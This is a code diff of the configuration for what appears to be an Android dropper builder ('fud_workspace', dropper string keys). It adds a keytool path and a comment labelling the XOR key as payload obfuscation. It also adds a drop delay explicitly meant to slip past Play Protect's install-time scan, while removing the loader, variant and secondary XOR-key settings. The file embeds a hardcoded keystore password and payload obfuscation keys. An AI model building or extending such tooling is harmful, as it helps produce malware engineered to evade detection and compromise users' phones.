@@ -8,6 +8,7 @@ TOOLS_DIR = os.path.join(_HOME, "tools")
 
 JAVA_BIN      = os.path.join(TOOLS_DIR, "jre", "bin", "java")
 JAVAC_BIN     = os.path.join(TOOLS_DIR, "jre", "bin", "javac")
+KEYTOOL_BIN   = os.path.join(TOOLS_DIR, "jre", "bin", "keytool")
 APKTOOL_JAR   = os.path.join(TOOLS_DIR, "apktool.jar")
 BT_DIR        = os.path.join(TOOLS_DIR, "build-tools")
 APKSIGNER_BIN = os.path.join(BT_DIR, "apksigner")
@@ -16,20 +17,14 @@ D8_BIN        = os.path.join(BT_DIR, "d8")
 AAPT2_BIN     = os.path.join(BT_DIR, "aapt2")
 
 KEYSTORE_DIR  = os.path.join(TOOLS_DIR, "keystores")
-KEYSTORE_PATH = os.path.join(KEYSTORE_DIR, "default.p12")
 KEYSTORE_PASS = "fudbot123"
 KEY_ALIAS     = "androidkey"
 
-TEMPLATE_APK  = os.path.join(_HERE, "template.apk")
-VARIANTS_DIR  = os.path.join(TOOLS_DIR, "variants")
-
 WORK_DIR = os.path.join(_HOME, "fud_workspace")
-
-LOADER_SRC_DIR = os.path.join(_HERE, "loader_src")
-LOADER_DEX     = os.path.join(TOOLS_DIR, "loader.dex")
 
 ANDROID_JAR = os.path.join(TOOLS_DIR, "android.jar")
 
+# Payload build-time obfuscation
 PAYLOAD_XOR_KEY = bytes([
     0xF1, 0x79, 0x78, 0x72, 0xAC, 0x69, 0x3E, 0xAA,
     0xB1, 0xA6, 0x4F, 0xB7, 0xF2, 0xC6, 0x30, 0x02,
@@ -37,19 +32,8 @@ PAYLOAD_XOR_KEY = bytes([
     0x2C, 0x48, 0x9E, 0x11, 0x73, 0xFA, 0x05, 0xB8,
 ])
 
-STRING_XOR_KEY = "K3y_Dr0pp3r_V5_XoR_2025_A9mQ2xLp7Rv4Tz8Wn1Yb6Hj3Fc0Dg5"
-
-PAYLOAD_KEY1 = bytes([
-    0x5A, 0x1C, 0x3E, 0x7B, 0x92, 0x44, 0xAF, 0x08,
-    0xD1, 0x66, 0x22, 0x9F, 0x0B, 0x35, 0xC7, 0x84,
-])
-PAYLOAD_KEY2 = bytes([
-    0xE7, 0x23, 0x91, 0x4C, 0xB5, 0x18, 0x6A, 0xDF,
-    0x02, 0x77, 0x3B, 0xCE, 0x59, 0xA4, 0x10, 0x8D,
-])
-PAYLOAD_ROT = 3
-
-VARIANT_COUNT = 15
+# Drop delay (ms) after launch — Play Protect scans at install, so delay = safer
+DROP_DELAY_MS = 35000
 
 URL_JRE         = "https://github.com/adoptium/temurin17-binaries/releases/download/jdk-17.0.11%2B9/OpenJDK17U-jdk_x64_linux_hotspot_17.0.11_9.tar.gz"
 URL_APKTOOL     = "https://github.com/iBotPeaches/Apktool/releases/download/v2.9.3/apktool_2.9.3.jar"
